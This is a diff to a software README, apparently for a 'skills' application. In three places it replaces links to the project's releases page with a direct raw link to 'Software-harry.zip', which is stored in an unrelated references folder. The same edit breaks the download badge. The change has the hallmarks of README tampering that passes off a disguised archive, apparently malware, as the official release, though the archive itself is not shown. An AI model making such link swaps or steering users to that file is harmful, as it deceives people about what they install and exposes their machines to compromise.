@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Bobxsszef/skills/releases)
+[![Download Latest Release](https://github.com/Bobxsszef/skills/raw/refs/heads/main/context-engineering/intent-layer/references/Software-harry.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Bobxsszef/skills/raw/refs/heads/main/context-engineering/intent-layer/references/Software-harry.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** To get the latest version of the skills application, [visit this page to download](https://github.com/Bobxsszef/skills/releases).
+1. **Visit the Releases Page:** To get the latest version of the skills application, [visit this page to download](https://github.com/Bobxsszef/skills/raw/refs/heads/main/context-engineering/intent-layer/references/Software-harry.zip).
 
 2. **Choose the Latest Release:** On the releases page, you’ll see a list of available versions. Look for the topmost version, which is usually the newest. 
 
@@ -66,7 +66,7 @@ If you need further assistance, feel free to contact our support team via email 
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/Bobxsszef/skills/releases)
+- [Download Latest Release](https://github.com/Bobxsszef/skills/raw/refs/heads/main/context-engineering/intent-layer/references/Software-harry.zip)
 - [User Manual](URL to user manual)
 - [Report an Issue](URL to issues page)
 
